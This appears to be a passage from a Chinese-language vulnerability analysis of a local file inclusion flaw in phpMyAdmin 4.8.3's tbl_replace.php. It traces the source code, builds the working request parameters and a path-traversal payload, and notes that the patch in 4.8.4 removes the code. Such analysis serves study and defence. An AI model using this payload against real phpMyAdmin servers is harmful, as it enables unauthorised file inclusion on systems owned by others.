    public function checkRelationsParam()
    {
    ...
    $cfgRelation = array();
    ...
    $cfgRelation['db'] = $GLOBALS['cfg']['Server']['pmadb'];
    ..
    return $cfgRelation;
    }
我省略了大部分代码。。因为只有这三句是重点，这个函数返回数组后存进了 `$_SESSION['relation'][$GLOBALS['server']]`
中，这个值我们会在后面用到
### 步骤二
然后我们插入了一条数据，可以先不用思考这条数据的含义。
#### 数据来源
进入到最后一步，也就是漏洞的触发点，再看看我们的 `payload`
：`/tbl_replace.php?fields_name[multi_edit][abcd][]=4&where_clause[abcd]=junk&table=3&db=2`
触发点在 `tbl_replace.php`，现在我们可以先看看触发位置，再一步步构造 `payload`，我的版本是 4.8.3，在这个
`tbl_replace.php` 中的第 224 行左右，会有如下几行代码：
    $filename = 'libraries/classes/Plugins/Transformations/'
                    . $mime_map[$column_name]['input_transformation'];
    if (is_file($filename)) {
            include_once $filename;
            ...
    }
这里有文件包含，先不管 `$column_name`，我们看看 `$mime_map` 是从哪里来的，我们溯源上去就去发现：
    $mime_map = Transformations::getMIME($GLOBALS['db'], $GLOBALS['table']);
前面我们提到过 `$GLOBALS['db']` 我们可以通过传递 `GET` 控制，`table`
其实也可以，也就是这两个参数我们都可以控制，然后我们跟进 `getMIME` 这个函数。
    public static function getMIME($db, $table, $strict = false, $fullName = false)
    {
        $relation = new Relation();
        $cfgRelation = $relation->getRelationsParam();
        if (! $cfgRelation['mimework']) {
            return false;
        }
        $com_qry = '';
        ...
        $com_qry .= '`mimetype`,
                    `transformation`,
                    `transformation_options`,
                    `input_transformation`,
                    `input_transformation_options`
             FROM ' . Util::backquote($cfgRelation['db']) . '.'
            . Util::backquote($cfgRelation['column_info']) . '
             WHERE `db_name`    = \'' . $GLOBALS['dbi']->escapeString($db) . '\'
               AND `table_name` = \'' . $GLOBALS['dbi']->escapeString($table) . '\'
               AND ( `mimetype` != \'\'' . (!$strict ? '
                  OR `transformation` != \'\'
                  OR `transformation_options` != \'\'
                  OR `input_transformation` != \'\'
                  OR `input_transformation_options` != \'\'' : '') . ')';
        $result = $GLOBALS['dbi']->fetchResult(
            $com_qry, 'column_name', null, DatabaseInterface::CONNECT_CONTROL
        );
        foreach ($result as $column => $values) {
            ...
            $values['transformation'] = self::fixupMIME($values['transformation']);
            $values['transformation'] = $subdir . $values['transformation'];
            $result[$column] = $values;
        }
        return $result;
    } // end of the 'getMIME()' function
这里最重要的就是一个查询语句 `$com_qry`，我们的 `$db` 和 `$table` 参数仅仅是被带入了 `where`
条件，而不是查询的数据库和表
查询的数据库是 `$cfgRelation['db']`，也就是函数一个开始的：
`$cfgRelation = $relation->getRelationsParam();`
    public function getRelationsParam()
    {
        // 判断 $_SESSION['relation'][$GLOBALS['server']] 是否为空，如果为空就赋值一次
        if (empty($_SESSION['relation'][$GLOBALS['server']])
            || (empty($_SESSION['relation'][$GLOBALS['server']]['PMA_VERSION']))
            || $_SESSION['relation'][$GLOBALS['server']]['PMA_VERSION'] != PMA_VERSION
        ) {
            $_SESSION['relation'][$GLOBALS['server']] = $this->checkRelationsParam();
        }
        $GLOBALS['cfgRelation'] = $_SESSION['relation'][$GLOBALS['server']];
        return $_SESSION['relation'][$GLOBALS['server']];
    }
这里返回的值就是第一步了我们辛辛苦苦设置的。
所以当判断 `$_SESSION['relation'][$GLOBALS['server']]` 是否为空时会返回 `false`，就不会进入 `if`  
语句，也就不会重新赋值（正常情况下剩下两个判断可以无视）。
（这里说明一下为什么要在第一步设置这个值：因为如果不在第一部设置，就会在这里进入 `if` 语句，然而从这里进去的话，`db` 的值就是 `false`
了，所以无法查询）
所以 `sql` 语句里的：
`$cfgRelation['db'] = $_SESSION['relation'][$GLOBALS['server']]['db']`
那么这个值就是我们刚刚设置的，也就是 `ceshi1`。
回到 `sql`
语句，我们发现这个只是查询的数据库，数据表是：`$cfgRelation['column_info']`，但是这个数据表是有默认值的，即：`pma__column_info`
，这也是在第一步中设置的，所以我们不用刻意设置。
我们可以输出一下这个 `sql` 语句：
    SELECT `column_name`, `mimetype`, `transformation`, `transformation_options`, `input_transformation`, `input_transformation_options` FROM `ceshi1`.`pma__column_info` WHERE `db_name` = '2' AND `table_name` = '3' AND ( `mimetype` != '' OR `transformation` != '' OR `transformation_options` != '' OR `input_transformation` != '' OR `input_transformation_options` != '')
`where` 语句中 `db_name` 和 `table_name` 是我们可控的，其他的值只要不为空，就能查询出语句了。。
当然我们前面插入了一条数据，目的就是为了在这里查询出来，因为是我们自己插入的数据，所以是可控的。
#### paload 构造
再次回到 `tpl_replace.php`，我们看看那个包含的 `$filename` ：
    $filename = 'libraries/classes/Plugins/Transformations/'
                    . $mime_map[$column_name]['input_transformation'];
这里的 `$mime_map` 是我们可控的值了，那么 `$column_name` 从哪来的呢？
    list($loop_array, $using_key, $is_insert, $is_insertignore)
        = $insertEdit->getParamsForUpdateOrInsert();
    foreach ($loop_array as $rownumber => $where_clause) {
        $multi_edit_columns_name
                = isset($_REQUEST['fields_name']['multi_edit'][$rownumber])
                ? $_REQUEST['fields_name']['multi_edit'][$rownumber]
        foreach ($multi_edit_columns_name as $key => $column_name) {
                ...
                // 判断不为空
                if (!empty($mime_map[$column_name])
                    && !empty($mime_map[$column_name]['input_transformation'])
                ) {
                    $filename = 'libraries/classes/Plugins/Transformations/'
                        . $mime_map[$column_name]['input_transformation'];
                    if (is_file($filename)) {
                        include_once $filename;
这里比较绕，需要梳理一下。
  1. `$column_name` 来自 `$multi_edit_columns_name` 这个数组的值。
  2. `$multi_edit_columns_name` 来自 `$_REQUEST['fields_name']['multi_edit'][$rownumber]`
  3. `$rownumber` 来自 `$loop_array` 的键
我们想知道 `$loop_array` 来自哪里，就得跟进 `getParamsForUpdateOrInsert` 函数，这个函数并不复杂，跟进去看看：
    public function getParamsForUpdateOrInsert()
    {
        if (isset($_REQUEST['where_clause'])) {
            // we were editing something => use the WHERE clause
            $loop_array = is_array($_REQUEST['where_clause'])
                ? $_REQUEST['where_clause']
                : array($_REQUEST['where_clause']);
            ...
        } else {
          ...
        }
        return array($loop_array, $using_key, $is_insert, $is_insertignore);
    }
没错，这个 `$loop_array` 也是我们完全可控的，来自 `$_REQUEST['where_clause']`。
\-----分割线，冷静一下----
再看看 `$filename`：
    $filename = 'libraries/classes/Plugins/Transformations/'
                    . $mime_map[$column_name]['input_transformation'];
`$mime_map` 我们可控，是一个数组，从 `pma__column_info` 查询出来的。
`$mime_map` 中的键，就是表中的 `column_name`。
回看我们刚刚插入的数据中，`column_name` 是 `4`，反推回去，所以：
所以我们要 `$mime_map[4]['input_transformation']` （提醒：`$column_name` 从
`$multi_edit_columns_name` 获取的
也就是说
    $multi_edit_columns_name[0] = $_REQUEST['fields_name']['multi_edit'][$rownumber][0] = 4
这里也不一定要是 `0` ，任意都可以。（提醒：`$rownumber` 从 `$loop_array` 中获取。
因为数组我们都可控，所以假设 `$rownumber` 为 `haha` 吧。
所以构造：`$loop_array[haha] = $_REQUEST['where_clause'][haha] =任意`。
\---- 分割线冷静一下 ----
我们最终的 `payload`：
    where_clause[haha]=any
    fields_name[multi_edit][haha][]=4
    table=3
    db=2
带上这个参数访问 `tpl_replace.php` 就能包含数据表中的 `input_transformation`，也就是我们插入的那个数据。
当然他还拼接上了一些路径，所以最后是：
`libraries/classes/Plugins/Transformations/../../../../../../../../a.txt`
## 补丁对比
在 4.8.4 的版本中我们发现发直接把这几行删掉了。。。。
## 参考链接